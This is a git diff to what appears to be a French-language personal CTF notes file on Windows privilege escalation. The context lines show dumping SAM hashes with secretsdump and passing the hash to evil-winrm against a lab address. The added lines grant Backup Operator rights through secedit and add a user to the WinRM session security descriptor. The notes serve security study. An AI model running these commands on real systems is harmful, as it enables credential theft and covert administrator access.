@@ -30,3 +30,24 @@ download sam.bak
 python3 /opt/impacket/examples/secretsdump.py -sam sam.bak -system system.bak LOCAL
 evil-winrm -i 10.10.66.252 -u Administrator -H <theHash>
 ```
+<br>
+<br>
+
+## Special Privileges and Security Descriptors
+
+```
+secedit /export /cfg config.inf
+```
+![image](https://github.com/LoKyOnTheCode/Securite-Informatique-et-CTF/assets/97956863/58320646-9e80-4e67-8fa1-7d529653acc9)
+
+```
+secedit /import /cfg config.inf /db config.sdb
+secedit /configure /db config.sdb /cfg config.inf
+```
+On doit maintenant avoir les privilèges `Backup Operator`.
+
+si utilisation de winrm, sur le GUI taper [PowerShell]
+```
+Set-PSSessionConfiguration -Name Microsoft.PowerShell -showSecurityDescriptorUI
+```
+Y ajouter l'utilisateur
